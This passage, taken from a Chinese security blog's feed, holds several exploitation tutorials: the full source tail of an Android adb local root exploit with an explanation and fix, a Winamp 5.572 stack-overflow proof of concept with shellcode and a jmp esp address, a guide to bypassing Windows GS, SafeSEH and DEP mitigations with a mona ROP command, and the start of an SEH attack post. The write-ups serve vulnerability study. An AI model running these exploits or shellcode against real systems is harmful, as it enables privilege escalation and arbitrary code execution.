class="keyword">int</span> i = <span class="number">0</span>, fd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">pid_t</span> found = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32000</span>; ++i) &#123;</span><br><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">"/proc/%d/cmdline"</span>, i);</span><br><span class="line"><span class="keyword">if</span> ((fd = open(buf, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">read(fd, buf, <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>);</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">"/sbin/adb"</span>)) &#123;</span><br><span class="line">found = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> found;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">restart_adb</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">kill(pid, <span class="number">9</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wait_for_root_adb</span><span class="params">(<span class="keyword">pid_t</span> old_adb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pid_t</span> p = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">p = find_adb();</span><br><span class="line"><span class="keyword">if</span> (p != <span class="number">0</span> &amp;&amp; p != old_adb)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line">kill(<span class="number">-1</span>, <span class="number">9</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pid_t</span> adb_pid = <span class="number">0</span>, p;</span><br><span class="line"><span class="keyword">int</span> pids = <span class="number">0</span>, new_pids = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> pepe[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">char</span> c = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rl</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] CVE-2010-EASY Android local root exploit (C) 2010 by 743C\n\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] checking NPROC limit ...\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getrlimit(RLIMIT_NPROC, &amp;rl) &lt; <span class="number">0</span>)</span><br><span class="line">die(<span class="string">"[-] getrlimit"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rl.rlim_cur == RLIM_INFINITY) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[-] No RLIMIT_NPROC set. Exploit would just crash machine. Exiting.\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] RLIMIT_NPROC=&#123;%lu, %lu&#125;\n"</span>, rl.rlim_cur, rl.rlim_max);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Searching for adb ...\n"</span>);</span><br><span class="line"></span><br><span class="line">adb_pid = find_adb();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!adb_pid)</span><br><span class="line">die(<span class="string">"[-] Cannot find adb"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] Found adb as PID %d\n"</span>, adb_pid);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Spawning children. Dont type anything and wait for reset!\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]\n[*] If you like what we are doing you can send us PayPal money to\n"</span></span><br><span class="line">       <span class="string">"[*] 7-4-3-C@web.de so we can compensate time, effort and HW costs.\n"</span></span><br><span class="line">       <span class="string">"[*] If you are a company and feel like you profit from our work,\n"</span></span><br><span class="line">       <span class="string">"[*] we also accept donations &gt; 1000 USD!\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]\n[*] adb connection will be reset. restart adb server on desktop and re-login.\n"</span>);</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fork() &gt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">setsid();</span><br><span class="line">pipe(pepe);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* generate many (zombie) shell-user processes so restarting</span></span><br><span class="line"><span class="comment"> * adb's setuid() will fail.</span></span><br><span class="line"><span class="comment"> * The whole thing is a bit racy, since when we kill adb</span></span><br><span class="line"><span class="comment"> * there is one more process slot left which we need to</span></span><br><span class="line"><span class="comment"> * fill before adb reaches setuid(). Thats why we fork-bomb</span></span><br><span class="line"><span class="comment"> * in a seprate process.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">close(pepe[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">if</span> ((p = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (p &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (new_pids) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n[+] Forked %d childs.\n"</span>, pids);</span><br><span class="line">new_pids = <span class="number">0</span>;</span><br><span class="line">write(pepe[<span class="number">1</span>], &amp;c, <span class="number">1</span>);</span><br><span class="line">close(pepe[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">++pids;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">close(pepe[<span class="number">1</span>]);</span><br><span class="line">read(pepe[<span class="number">0</span>], &amp;c, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">restart_adb(adb_pid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">fork();</span><br><span class="line"><span class="keyword">for</span> (;;)</span><br><span class="line">sleep(<span class="number">0x743C</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wait_for_root_adb(adb_pid);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑比较简单，如下：</p><ul><li>无限循环创建子进程，并杀掉其父进程，让之变为僵尸进程</li><li>达到进程上限数</li><li>Kill adb，此时adbd会重启adb</li><li>adb启动后读取ro.secure，发现true，启动降权策略</li><li>但因为用户当前的进程数已达上限，降权失败，继续维持Root权限</li><li>故此时，我们便可利用adb将su放置于/system/bin或者/system/xbin</li></ul><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在adb中加一行判断即可，如果setuid或者setgid失败，则exit</p><h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><ul><li><a href="https://thesnkchrmr.wordpress.com/2011/03/24/rageagainstthecage/" target="_blank" rel="noopener">https://thesnkchrmr.wordpress.com/2011/03/24/rageagainstthecage/</a></li><li><a href="https://github.com/srclib/RageAgainstTheCage/tree/master/RageAgainstTheCage" target="_blank" rel="noopener">https://github.com/srclib/RageAgainstTheCage/tree/master/RageAgainstTheCage</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文介绍利用adb获取Android系统的ROOT权限&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Root" scheme="http://imlzq.com/tags/Root/"/>
    
      <category term="专栏-提权" scheme="http://imlzq.com/tags/%E4%B8%93%E6%A0%8F-%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>通关栈溢出（五）：Winamp 5.572栈溢出漏洞利用</title>
    <link href="http://imlzq.com/2018/08/14/stackoverflow_winamp5572/"/>
    <id>http://imlzq.com/2018/08/14/stackoverflow_winamp5572/</id>
    <published>2018-08-14T14:34:00.000Z</published>
    <updated>2018-08-31T09:07:35.591Z</updated>
    
    <content type="html"><![CDATA[<p>光说不练假把式，从现在开始会写一些漏洞的利用</p><p>第一篇文章会从POC的角度分析漏洞并利用。</p><p>Target：Winamp </p><p>Version：5.572</p><p>Detail: Stack overflow</p><a id="more"></a>    <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Winamp是一款音乐播放软件，在他的5.572版本中存在一个栈溢出。</p><p><strong>它的表现形式是：</strong></p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_origin.png" alt="Version History"></p><p>当用户点击Help-&gt;Abount winamp-&gt;Version History时会读取whatsnew.txt文件，并将读取到的数据放置到本地的一个数组中，只是这个过程使用了strcpy函数，从而造成缓冲区溢出。</p><p><strong>从网络上得到如下的POC：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里的Shellcode和下方的jmp esp我已修改。calc.exe</span></span><br><span class="line">sc = (<span class="string">"\x83\xEC\x50\x33\xDB\x53\x68\x6C\x6C\x20\x20\x68\x33\x32\x2E\x64\x68"</span></span><br><span class="line">      <span class="string">"\x75\x73\x65\x72\x8B\xDC\x53\xB8\x77\x1D\x80\x7C\x8B\xC0\xFF\xD0\x33"</span></span><br><span class="line">      <span class="string">"\xDB\x53"</span></span><br><span class="line">      <span class="string">"\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63"</span></span><br><span class="line">      <span class="string">"\x8B\xC4\x53\x50\xB9"</span></span><br><span class="line">      <span class="string">"\x4D\x11\x86\x7C\xFF\xD1\x33\xDB\x53\xB8\xA2\xCA\x81\x7C\xFF\xD0"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">version = <span class="string">"Winamp 5.572"</span></span><br><span class="line"></span><br><span class="line">rop = <span class="string">"\x41"</span> * <span class="number">540</span>          <span class="comment"># Crash</span></span><br><span class="line">rop += <span class="string">"\xed\x1e\x96\x7c"</span>   <span class="comment"># jmp esp</span></span><br><span class="line"><span class="comment">#junk = "\x43" * 800</span></span><br><span class="line">junk = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">tecfile = open(<span class="string">'whatsnew.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">tecfile.write(version + rop + sc + junk)</span><br><span class="line">tecfile.close()</span><br></pre></td></tr></table></figure><p>POC也就是whatsnew.txt，由4部分构成，第一部分是Version，这个在之后会讲到。第二部分时填充缓冲区的A字符，第三部分是jmp esp，第四部分是弹出计算器的Shellcode。</p><h2 id="Attacking"><a href="#Attacking" class="headerlink" title="Attacking"></a>Attacking</h2><p>使用恶意构造的whatsnew.txt替换程序原始的txt文件，重新运行程序，点击Version History，成功溢出。结果如下：</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_hacked.png" alt="hacked"></p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>使用OllyDbg打开winamp.exe，并运行。</p><p>既然程序会读取whatsnew.txt，那么我们就全局搜索这个关键字，看在哪里调用了它。</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_search_all_txt.png" alt="search all"></p><p>上滑到text列表的顶部，右键，选择search text，输入whatsnew.txt</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_search_txt1.png" alt="search text1"></p><p>能得到如下的两个结果，双击跟进并给他们下断点。</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_text2.png" alt="search text2"></p><p>这时候我们点击程序的Version History，发现程序段在了004015B2这个位置，顺着代码继续静态分析。我们能看到程序使用malloc在堆中创建了20000DWROD的空间。</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_malloc.png" alt="malloc"></p><p>并使用strncmp比较txt文件中的前9个字节，判断是否是Winamp 5.开头，这也是为什么POC中会存在版本号的原因。</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_strcmp.png" alt="strncmp"></p><p>最后一步就是执行strcpy，这里就不用再介绍啦。</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_winamp_strcpy.png" alt="strcpy"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;光说不练假把式，从现在开始会写一些漏洞的利用&lt;/p&gt;
&lt;p&gt;第一篇文章会从POC的角度分析漏洞并利用。&lt;/p&gt;
&lt;p&gt;Target：Winamp &lt;/p&gt;
&lt;p&gt;Version：5.572&lt;/p&gt;
&lt;p&gt;Detail: Stack overflow&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="通关" scheme="http://imlzq.com/tags/%E9%80%9A%E5%85%B3/"/>
    
      <category term="专栏" scheme="http://imlzq.com/tags/%E4%B8%93%E6%A0%8F/"/>
    
  </entry>
  
  <entry>
    <title>通关栈溢出（四）：缓冲区溢出的防御技术及绕过</title>
    <link href="http://imlzq.com/2018/08/11/stackoverflow_protection/"/>
    <id>http://imlzq.com/2018/08/11/stackoverflow_protection/</id>
    <published>2018-08-10T16:00:00.000Z</published>
    <updated>2018-08-29T04:05:27.098Z</updated>
    
    <content type="html"><![CDATA[<p>前面几篇介绍了如何利用栈溢出，本文就介绍一下windows现有的缓冲区溢出缓解技术以及他们的绕过方案。</p><p>包括ASLR、SafeSEH、SEHOP、DEP、GS</p><p>其实看完本文就能发现，攻与防都是相对的，这上面的5种防御全是基于现有的栈溢出攻击手段来做的，而攻击者又针对这5种防御手段做出新的攻击策略。这个就是我认为安全攻防有意思的点</p><p>OS： Windows XP SP2, Window 7，Windows 2000</p><p>Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0</p><a id="more"></a>   <h2 id="一、GS"><a href="#一、GS" class="headerlink" title="一、GS"></a>一、GS</h2><table><thead><tr><th>栈布局</th></tr></thead><tbody><tr><td>局部变量</td></tr><tr><td>security_cookie</td></tr><tr><td>入栈寄存器</td></tr><tr><td>SEH节点</td></tr><tr><td>返回地址</td></tr><tr><td>函数参数</td></tr><tr><td>虚函数表</td></tr></tbody></table><p>先把这个展示了很久的栈布局再贴出来一次。</p><p>我们在<a href="http://imlzq.com/2018/08/07/stackOverFlow_1/">通关栈溢出（一）：原理及初级攻击</a>这篇文章中，介绍了用覆盖函数返回地址的方法执行我们的Shellcode，但如果操作系统在函数调用前就在返回值前方插入一个security_cookie，每次return时校验这个security_cookie是否有改动不就可以完美的判断当前的栈是否发生了缓冲区溢出了吗？</p><p>这就是GS所做的任务。GS插入的这个security_cookie也被称为Canary（小趣闻：以前矿工工作时，会先放只鸟下去看看氧气含量是否达标，以此检测是否安全）。</p><p><strong>它的执行逻辑为：</strong></p><ol><li>系统在.data的内存区域种存放一个SecurityCookie的副本。程序每次运行时会以.data的第一个双字作为Cookie的种子，或者原始Cookie。因此程序每次运行所产生的Cookie种子就有区别。</li><li>在所有的函数调用发生时，向栈帧中压入一个额外的随机DWORD。排列顺序如上表，它位于EBP和返回地址之前。当栈帧初始化以后系统用ESP异或Cookie种子，作为这里的DWORD，也就是当前函数的Cookie，以此作为不同函数之间的区别。</li><li>在函数返回前，系统将执行一个额外的安全验证操作SecurityCheck，先用ESP还原出（异或）Cookie的种子，匹配该种子和.data区域的数值是否一样。</li><li>如果不一样，<strong>进行异常处理流程</strong>，函数不会正常返回，ret指令也不会被执行。</li></ol><p><strong>例外：</strong></p><p>从上面的执行逻辑我们能发现一点，就是GS一定对程序的效率有影响，因为它给所有函数都加上这个校验，那就意味着每次都会多一个check.</p><p>如果现在有个函数，它的唯一功能是index += 1。在外部我们用for循环反复调用10000次，那这里的性能损耗是能直接看出来的：执行Security校验的总时间加起来比函数本身的消耗还长。对于一个操作系统来讲，这是很差劲的一件事情。因此GS是允许存在例外的，在这些例外中，函数不会被插入canary。</p><blockquote><ol><li>函数不包含缓冲区</li><li>函数被定义为具有变量参数列表</li><li>函数使用无保护的关键字标记</li><li>函数在第一个语句中包含内嵌汇编代码</li><li>缓冲区不是8字节类型且大小不大于4个字节</li></ol></blockquote><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>单从上面这几点，我们不难看出，GS有几项很明显的攻击面：</p><ul><li>SecurityCheck失败后，程序会进入异常处理流程，也就是SEH（这里的SEH不属于当前栈，无法直接攻击它）。  这里是不是很熟悉？</li><li>GS为了性能，允许存在例外，那这些例外我们可以利用吗？</li><li>SecurityCheck是和.data中存放的canary副本做匹配，那如果攻击者把.data内存放的canary副本都改了呢？</li></ul><h3 id="攻击1：利用未保护的内存突破GS"><a href="#攻击1：利用未保护的内存突破GS" class="headerlink" title="攻击1：利用未保护的内存突破GS"></a>攻击1：利用未保护的内存突破GS</h3><p>如果函数不包含4字节以上的缓冲区，那么即使GS处于开启状态，这么函数也是不受保护的。</p><p>其他GS的例外也同理</p><p>因此，在Hack之前，我们可以判断当前函数是否符合例外。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">(<span class="keyword">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> arr[<span class="number">4</span>]; <span class="comment">// 这里的arr不超过4字节，无GS校验，可以正常攻击</span></span><br><span class="line">    <span class="built_in">strcpy</span>(arr, str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="攻击2：攻击虚函数"><a href="#攻击2：攻击虚函数" class="headerlink" title="攻击2：攻击虚函数"></a>攻击2：攻击虚函数</h3><p><a href="http://imlzq.com/2018/08/09/stackoverflow_virtualmethod/">通关栈溢出（二）：攻击C++的虚函数</a></p><p>GS只有在函数返回时才会去检查security_check，而虚函数攻击是在程序未返回时（函数中显式调用虚函数）就已发生了，因此可以直接绕过GS校验。</p><h3 id="攻击3：-攻击SEH"><a href="#攻击3：-攻击SEH" class="headerlink" title="攻击3： 攻击SEH"></a>攻击3： 攻击SEH</h3><p><a href="http://imlzq.com/2018/08/10/stackoverflow_seh/">通关栈溢出（三）：攻击SEH</a></p><p>同理，SEH也是可以攻击的，只要我们提前触发Exception，就能实现攻击</p><h3 id="攻击4：同时替换栈中和-data中的Cookie"><a href="#攻击4：同时替换栈中和-data中的Cookie" class="headerlink" title="攻击4：同时替换栈中和.data中的Cookie"></a>攻击4：同时替换栈中和.data中的Cookie</h3><p>这种攻击方式会比较局限，取决于当前缓冲区的情况。</p><p>例如现在有个数组，arr[8]，如果我们能访问到arr[-10000]这种负值的话，就能跳转到.data区域了。再将.data区域存放的Canary副本替换成攻击样本，这样即使函数return时校验了GS，结果也会是一样的。</p><p><strong>那如何找到.data中Canary副本的位置呢？</strong></p><p>函数执行时，如果该函数存在GS，那么我们能够在汇编窗口中看到明显的插入代码。</p><blockquote><p>mov eax, dword ptr ds:[403000]</p><p>xor eax, ebp</p><p>mov dword ptr ss:[ebp-4], eax</p></blockquote><p>上文的意思也就是icon过0x00403000处取出Canary，与当前的ebp进行异或然后放入ebp-4的位置。</p><p>所以我们的目标就是让缓冲区覆盖到0x00403000这个位置即可，4个字节就能完成对他的覆盖了。只是因为这种攻击方法会非常局限，毕竟要能访问负地址的缓冲区是少数的。</p><h2 id="二、SafeSEH"><a href="#二、SafeSEH" class="headerlink" title="二、SafeSEH"></a>二、SafeSEH</h2><p><a href="http://imlzq.com/2018/08/10/stackoverflow_seh/">通关栈溢出（三）：攻击SEH</a></p><p>之前介绍到了攻击SEH，微软也发现了老版本的SEH存在的这个问题，所以新提出了SafeSEH的概念。</p><p>我们攻击SEH时主要策略是修改SEH的next指针，让其指向我们的Shellcode，控制程序的jmp位置。SafeSEH的防御措施为：</p><ul><li>在程序运行前先把程序里所有已包含的SEH信息记录在程序内存的一个表中</li><li>当程序发生异常时，先在表中查询该跳转地址是否合法</li></ul><p>这样其实就能拦截我们修改后的Shellcode地址了。</p><p>SafeSEH的校验分三步：</p><ol><li>检查异常处理链是否位于当前程序的栈中。如果不在栈中，终止</li><li>检查异常处理函数指针是否指向当前程序的栈中。如果指向栈中，终止</li><li>第三步看下图</li></ol><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_safeseh_checkvalid.png" alt="stackoverflow_safeseh_checkvalid.png"></p><p><strong>攻击方式：</strong></p><ul><li>攻击返回地址</li><li>攻击虚函数</li><li>从堆中绕过：如果SEH的异常函数指针指向堆区，即使安全校验发现了SEH已经不可信，仍然会调用其已被修改过的异常处理函数。因此，我们只需要将shellcode布置到对去就可以直接跳转执行。</li><li>利用未启用SafeSEH的模块绕过SafeSEH</li><li>利用加载模块之外的地址绕过SafeSEH</li></ul><h2 id="三、DEP"><a href="#三、DEP" class="headerlink" title="三、DEP"></a>三、DEP</h2><p>数据是数据，代码是代码，栈是数据，就不让执行代码。这就是Data Execution Prevention。</p><p>它的基本原理是将数据所在内存页标识为不可知行，当程序溢出转入Shellcode时，程序会尝试在数据页面上执行指令。</p><p>操作系统通过设置内存页的NX/XD属性标记，来指明不能从该内存执行代码。为了实现这个功能，需要在内存的Page Table中加入一个特殊的标志位（NX/XD）来标识是否允许在该页上执行指令。</p><h3 id="攻击：ROP"><a href="#攻击：ROP" class="headerlink" title="攻击：ROP"></a>攻击：ROP</h3><p>既然不让我在数据区执行代码，那么我把Shellcode的数据指向代码区会怎么样呢？比如现在进程中加载了N个库，这些库里说不定就会有我们可以执行的代码，只要能确定它的地址并把它们一个个的串起来，不就可以实现我们的攻击了吗？</p><p>其实攻击DEP的主要思想为，关掉它。在Android中，我们可以使用mprotect去修改内存的可读写状态，在windows中，我们可以用VirtualProtect关闭DEP。</p><p><strong>如何找到调用VirtualProtect函数所需的汇编指令地址呢？</strong></p><p>掏出软件Immunity Debugger，安装mona插件，地址为<a href="https://github.com/corelan/mona" target="_blank" rel="noopener">https://github.com/corelan/mona</a>，attach当前进程，在最下方的命令行中输入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona rop -m *.dll -cp nonull</span><br></pre></td></tr></table></figure><p>执行命令后在C:Program FilesImmunity IncImmunity Debugger下生成文件rop.txt、rop_chains.txt、rop_suggestions.txt、stackpivot.txt</p><p>查看rop_chains.txt，会列出可用来关闭DEP的ROP链，选择VirtualProtect()函数</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_dep_1.png" alt="stackoverflow_dep_1.png"></p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_dep_2.png" alt="stackoverflow_dep_2.png"></p><p>如上图，成功构建ROP链.</p><p>需要注意一点，如果当前进程已加载的dll均无法找到合适的跳转，也就意味着ROP链构建失败</p><p>接着，修改我们的shellcode，将上方的16进制写入即可。之前我们使用\x83\x16这种方式写的，所以ROP的话就应该将他们全都转为16进制，注意小端显示，所以需要反着写。</p><h2 id="四、ASLR"><a href="#四、ASLR" class="headerlink" title="四、ASLR"></a>四、ASLR</h2><h2 id="五、SEHOP"><a href="#五、SEHOP" class="headerlink" title="五、SEHOP"></a>五、SEHOP</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前面几篇介绍了如何利用栈溢出，本文就介绍一下windows现有的缓冲区溢出缓解技术以及他们的绕过方案。&lt;/p&gt;
&lt;p&gt;包括ASLR、SafeSEH、SEHOP、DEP、GS&lt;/p&gt;
&lt;p&gt;其实看完本文就能发现，攻与防都是相对的，这上面的5种防御全是基于现有的栈溢出攻击手段来做的，而攻击者又针对这5种防御手段做出新的攻击策略。这个就是我认为安全攻防有意思的点&lt;/p&gt;
&lt;p&gt;OS： Windows XP SP2, Window 7，Windows 2000&lt;/p&gt;
&lt;p&gt;Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="通关" scheme="http://imlzq.com/tags/%E9%80%9A%E5%85%B3/"/>
    
      <category term="专栏" scheme="http://imlzq.com/tags/%E4%B8%93%E6%A0%8F/"/>
    
  </entry>
  
  <entry>
    <title>通关栈溢出（三）：攻击SEH</title>
    <link href="http://imlzq.com/2018/08/10/stackoverflow_seh/"/>
    <id>http://imlzq.com/2018/08/10/stackoverflow_seh/</id>
    <published>2018-08-09T16:00:00.000Z</published>
    <updated>2018-08-27T12:04:17.304Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍利用SEH来实现栈溢出</p><p>OS： Windows XP SP2, Window 7，Windows 2000</p><p>Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0</p><a id="more"></a>    <h2 id="S-E-H"><a href="#S-E-H" class="headerlink" title="S.E.H"></a>S.E.H</h2><blockquote><p>Structture Exception Handler: 异常处理结构体。它是windows异常处理机制所采用的重要数据结构。</p><p>每个S.E.H包含两个DWORD指针：SEH链表指针和异常处理函数句柄，共8个字节。</p></blockquote><p><strong>简单点就是，多个SEH是用链表串起来的，因此每个SEH都包含当前的Exception handler和一个next指针</strong></p><ol><li>SEH结构体存放在系统栈中</li><li>当线程初始化时，会自动向栈中安装一个SEH作为线程默认的异常处理</li><li>如果程序员代码中使用了__try{}__except{}或者Assert宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个SEH来实现异常处理</li><li>栈中一般同时会存在多个SEH</li><li>栈中的多个SEH通过链表指针在栈内由栈顶向栈底串成单项链表，位于链表最顶端的SEH通过TEB（线程环境块）0字节偏移处的指针标识</li><li>当异常发生时，操作系统会中断程序，并首先从TEB的0字节偏移处取出距离栈顶最近的S.E.H，使用异常处理函数句柄所指向的代码来处理异常。</li><li>当离“事故现场”最近的异常处理函数运行失败时，将顺着SEH链依次尝试其他的异常处理函数</li><li>如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框然后强制关闭程序。</li></ol><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>从上面的定义我们不难看出，SEH是存放在栈里的。这也就说明，如果发生栈溢出，那么溢出的代码是可以覆盖掉SEH的入口地址的。而此时只要我们再手动触发一下目标异常，就能跳转到Shellcode了</p><p>下图是函数调用时栈内的情况，如果在程序中设置了try-except，那么SEH节点会更多</p><table><thead><tr><th>栈布局</th></tr></thead><tbody><tr><td>局部变量</td></tr><tr><td>security_cookie ：      gs校验码，操作系统用于检测是否有溢出，需要操作系统支持且编译时开启</td></tr><tr><td>入栈寄存器</td></tr><tr><td>SEH节点</td></tr><tr><td>返回地址</td></tr><tr><td>函数参数</td></tr><tr><td>虚函数表</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 